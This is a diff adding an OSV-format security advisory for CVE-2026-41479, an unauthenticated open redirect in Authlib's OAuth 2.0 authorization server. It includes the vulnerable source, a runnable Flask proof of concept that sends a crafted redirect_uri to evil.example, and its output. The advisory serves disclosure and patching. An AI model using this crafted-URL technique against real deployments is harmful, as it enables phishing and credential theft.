@@ -1,0 +1,134 @@
+{
+  "id": "GHSA-w8p2-r796-3vmq",
+  "modified": "2026-06-08T18:00:15.935951089Z",
+  "published": "2026-06-08T17:52:04Z",
+  "aliases": [
+    "CVE-2026-41479"
+  ],
+  "summary": "Authlib OAuth 2.0 has Open Redirect in Authorization API that allows attacker-controlled redirect_uri through unsupported response_type",
+  "details": "### Summary\nAuthlib's OAuth 2.0 authorization endpoint can be turned into an unauthenticated open redirect when a request uses an unsupported response_type and supplies an attacker-controlled redirect_uri.\n\nThe vulnerable behavior happens before client lookup and before any redirect URI validation. As a result, an attacker does not need a valid client registration, an authenticated user, or any prior state. A single request to the authorization endpoint is enough to obtain a 302 Location response to an arbitrary attacker-controlled URL.\n\nIt was confirmed that the vulnerable code is present in tag v1.6.6 and in the current HEAD under test (68e6ab3fdfc71a328b1966bad5c6aba0f7d0c2e1, git describe: v1.6.6-104-g68e6ab3f). The issue was dynamically reproduced locally on the current HEAD.\n\n### Details\nThe root cause is that `AuthorizationServer.get_authorization_grant()` copies the raw request\n  `redirect_uri` into an `UnsupportedResponseTypeError` before any client has been resolved and\n  before any redirect URI validation has happened:\n\n  ```python\n  # authlib/oauth2/rfc6749/authorization_server.py\n  raise UnsupportedResponseTypeError(\n      f\"The response type '{request.payload.response_type}' is not supported by the server.\",\n      request.payload.response_type,\n      redirect_uri=request.payload.redirect_uri,\n  )\n\n  That error object is later rendered by OAuth2Error.__call__(). If redirect_uri is set, Authlib\n  automatically returns a redirect response to that URI:\n\n  # authlib/oauth2/base.py\n  def __call__(self, uri=None):\n      if self.redirect_uri:\n          params = self.get_body()\n          loc = add_params_to_uri(self.redirect_uri, params, self.redirect_fragment)\n          return 302, \"\", [(\"Location\", loc)]\n      return super().__call__(uri=uri)\n\n  This means an unsupported response_type request can force the authorization server to redirect\n  to an attacker-controlled URL even when:\n\n  1. no valid client exists,\n  2. no grant matched the request,\n  3. no registered redirect_uri was ever checked.\n\n  This is not a contrived code path. It is reachable through the normal Authlib authorization\n  endpoint flow documented for Flask and Django integrations, where applications are told to call\n  server.get_consent_grant(...) and then server.handle_error_response(...) on OAuth2Error.\n\n  Relevant source and documentation references:\n\n  - authlib/oauth2/rfc6749/authorization_server.py\n  - authlib/oauth2/base.py\n  - docs/flask/2/authorization-server.rst\n  - docs/django/2/authorization-server.rst\n\n  ### PoC\n\n  Local test environment:\n\n  - Repository checkout: 68e6ab3fdfc71a328b1966bad5c6aba0f7d0c2e1\n  - git describe: v1.6.6-104-g68e6ab3f\n  - Python virtualenv: ./.venv\n  - Environment variable: AUTHLIB_INSECURE_TRANSPORT=true\n\n  Note: AUTHLIB_INSECURE_TRANSPORT=true was only used to allow local loopback HTTP reproduction.\n  It does not create the vulnerable behavior. In a real deployment the same logic is reachable\n  over HTTPS.\n\n  Run this exact PoC from the repository root:\n\n  export AUTHLIB_INSECURE_TRANSPORT=true\n  ./.venv/bin/python - \u003c\u003c'PY'\n  import os, json\n  from flask import Flask, request\n  from authlib.integrations.flask_oauth2 import AuthorizationServer\n  from authlib.oauth2 import OAuth2Error\n  from authlib.oauth2.rfc6749.grants import AuthorizationCodeGrant as _AuthorizationCodeGrant\n\n  os.environ[\"AUTHLIB_INSECURE_TRANSPORT\"] = \"true\"\n\n  class AuthorizationCodeGrant(_AuthorizationCodeGrant):\n      def save_authorization_code(self, code, request):\n          raise RuntimeError(\"not reached\")\n      def query_authorization_code(self, code, client):\n          return None\n      def delete_authorization_code(self, authorization_code):\n          pass\n      def authenticate_user(self, authorization_code):\n          return None\n\n  app = Flask(__name__)\n  app.secret_key = \"testing\"\n\n  server = AuthorizationServer(\n      app,\n      query_client=lambda client_id: None,\n      save_token=lambda token, request: None,\n  )\n  server.register_grant(AuthorizationCodeGrant)\n\n  @app.route(\"/oauth/authorize\", methods=[\"GET\", \"POST\"])\n  def authorize():\n      try:\n          grant = server.get_consent_grant(end_user=None)\n      except OAuth2Error as error:\n          return server.handle_error_response(request, error)\n      return server.create_authorization_response(grant=grant, grant_user=None)\n\n  with app.test_client() as c:\n      cases = {\n          \"without_redirect_uri\": \"/oauth/authorize?response_type=totally-unsupported\u0026state=s1\",\n          \"with_attacker_redirect_uri\": \"/oauth/authorize?response_type=totally-\n  unsupported\u0026redirect_uri=https%3A%2F%2Fevil.example%2Flanding\u0026state=s1\",\n      }\n      out = {}\n      for name, url in cases.items():\n          r = c.get(url)\n          out[name] = {\n              \"status\": r.status_code,\n              \"location\": r.headers.get(\"Location\"),\n              \"body\": r.get_data(as_text=True),\n          }\n      print(json.dumps(out, indent=2))\n  PY\n\n  Observed result:\n\n  {\n    \"without_redirect_uri\": {\n      \"status\": 400,\n      \"location\": null,\n      \"body\": \"{\\\"error\\\": \\\"unsupported_response_type\\\", \\\"error_description\\\": \\\"totally-\n  unsupported\\\", \\\"state\\\": \\\"s1\\\"}\"\n    },\n    \"with_attacker_redirect_uri\": {\n      \"status\": 302,\n      \"location\":\n  \"https://evil.example/landing?error=unsupported_response_type\u0026error_description=totally-unsupported\u0026state=s1\",                                                                                    \n      \"body\": \"\"\n    }\n  }\n\n  This demonstrates that the only difference between a local error and an external redirect is\n  whether the attacker supplies redirect_uri.\n\n  The same behavior was locally reproduced with the Django integration using RequestFactory; it\n  returned:\n\n  {\n    \"status\": 302,\n    \"location\":\n  \"https://evil.example/landing?error=unsupported_response_type\u0026error_description=totally-unsupported\u0026state=s1\",                                                                                    \n    \"body\": \"\"\n  }\n\n### Impact\n  This is an unauthenticated open redirect in an internet-facing authorization endpoint.\n\n  Who is impacted:\n\n  - Any deployment using Authlib's OAuth 2.0 authorization server and the documented authorization\n    endpoint flow.\n  - No special feature flag is required beyond running the authorization endpoint itself.\n\n  Attacker prerequisites:\n\n  - None beyond the ability to send a victim to a crafted authorization URL.\n\n  Practical harm:\n\n  - Phishing and credential theft by abusing a trusted authorization server domain as a\n    redirector.\n  - Bypass of domain-based allowlists that trust the authorization server's host.\n  - SSO / OAuth confusion in ecosystems where trusted authorization endpoints are expected to\n    reject unregistered redirect URIs before redirecting.\n\n  The issue is especially concerning because the redirect happens before client existence and\n  redirect URI legitimacy are established.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "authlib",
+        "purl": "pkg:pypi/authlib"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.6.10"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1",
+        "0.10",
+        "0.11",
+        "0.12",
+        "0.12.1",
+        "0.13",
+        "0.14",
+        "0.14.1",
+        "0.14.2",
+        "0.14.3",
+        "0.15",
+        "0.15.1",
+        "0.15.2",
+        "0.15.3",
+        "0.15.4",
+        "0.15.5",
+        "0.15.6",
+        "0.1rc0",
+        "0.2",
+        "0.2.1",
+        "0.3",
+        "0.4",
+        "0.4.1",
+        "0.5",
+        "0.5.1",
+        "0.6",
+        "0.7",
+        "0.8",
+        "0.9",
+        "1.0.0",
+        "1.0.0a1",
+        "1.0.0a2",
+        "1.0.0b1",
+        "1.0.0b2",
+        "1.0.0rc1",
+        "1.0.1",
+        "1.1.0",
+        "1.2.0",
+        "1.2.1",
+        "1.3.0",
+        "1.3.1",
+        "1.3.2",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.6.0",
+        "1.6.1",
+        "1.6.2",
+        "1.6.3",
+        "1.6.4",
+        "1.6.5",
+        "1.6.6",
+        "1.6.7",
+        "1.6.8",
+        "1.6.9"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-w8p2-r796-3vmq/GHSA-w8p2-r796-3vmq.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "authlib",
+        "purl": "pkg:pypi/authlib"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.7.0"
+            },
+            {
+              "fixed": "1.7.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.7.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-w8p2-r796-3vmq/GHSA-w8p2-r796-3vmq.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/security/advisories/GHSA-w8p2-r796-3vmq"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/commit/3be08468201a7766a93012ce149ea12822cab096"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/authlib/authlib"
+    }
+  ]
+}
